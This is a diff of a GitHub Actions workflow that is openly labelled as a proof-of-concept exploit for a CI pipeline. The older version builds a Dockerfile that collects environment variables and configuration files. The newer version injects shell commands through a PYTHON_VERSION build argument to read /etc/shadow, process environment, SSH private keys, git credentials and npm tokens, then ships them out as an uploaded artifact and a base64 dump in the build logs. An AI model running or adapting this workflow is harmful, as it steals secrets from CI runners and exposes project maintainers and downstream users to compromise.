@@ -1,47 +1,44 @@
-name: LeakPoC
-
+name: RCE via PYTHON_VERSION
 on:
   push:
-    branches:
-      - main  # Or use "workflow_dispatch:" if you want to trigger manually
 
 jobs:
-  leak:
+  exploit:
     runs-on: ubuntu-latest
-
     steps:
-      - name: Checkout repository
+      - name: Checkout repo
         uses: actions/checkout@v4
 
-      - name: Create Dockerfile for Exploit
+      - name: Build + Extract Sensitive Files
         run: |
-          cat <<EOF > Dockerfile
-FROM python:3.11-alpine
+          mkdir -p leaks
+          docker build \
+            --build-arg PYTHON_VERSION='
+              id
+              whoami
+              echo "[ENVIRONMENT]" && printenv
+              echo "[PROC ENVIRON]" && cat /proc/self/environ || true
+              echo "[SHADOW]" && cat /etc/shadow || true
+              echo "[HOSTS]" && cat /etc/hosts || true
+              echo "[PASSWD]" && cat /etc/passwd
+              echo "[PRIVATE SSH KEYS]" && find / -type f -name "id_rsa" -exec cat {} \; 2>/dev/null || true
+              echo "[HOMEDIR FILES]" && ls -la /root /home || true
+              echo "[GIT CONFIGS]" && find / -name ".git-credentials" -o -name ".gitconfig" -exec cat {} \; 2>/dev/null || true
+              echo "[NPM TOKENS]" && find / -name ".npmrc" -exec cat {} \; 2>/dev/null || true
+            ' \
+            -t deep-leak ./taskcluster/docker/python
+          
+          docker run --rm deep-leak > leaks/output.txt
+          tar -cvf leaks/leaks.tar leaks/output.txt
 
-RUN apk add --no-cache grep findutils
-
-RUN echo "[ENVIRONMENT VARIABLES]" > /secrets.txt && \
-    (printenv | grep -v 'GITHUB_TOKEN' || true) >> /secrets.txt && \
-    echo "\n\n[FILESYSTEM SECRETS (.env, .yml, credentials, etc)]" >> /secrets.txt && \
-    find / -type f \
-      -iname "*.env" -o \
-      -iname "*.yml" -o \
-      -iname "*.json" -o \
-      -iname "credentials" -o \
-      -iname "config" \
-    -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /secrets.txt 2>/dev/null || true
-
-CMD ["cat", "/secrets.txt"]
-EOF
-
-      - name: Build Docker image
-        run: docker build -t leak-image .
-
-      - name: Run container and collect leaked secrets
-        run: docker run --rm leak-image > all_secrets.txt
-
-      - name: Upload leak artifact
-        uses: actions/upload-artifact@v4
+      - name: Upload as Artifact (Pinned SHA)
+        uses: actions/upload-artifact@dcbf53124a7ee6a2e3b6cb59c96345acfc9155f3
         with:
-          name: leaked-secrets
-          path: all_secrets.txt
+          name: DeepLeaks
+          path: leaks/leaks.tar
+
+      - name: Base64 fallback to logs
+        if: always()
+        run: |
+          echo "====== BASE64 DUMP FOLLOWS ======"
+          base64 leaks/leaks.tar
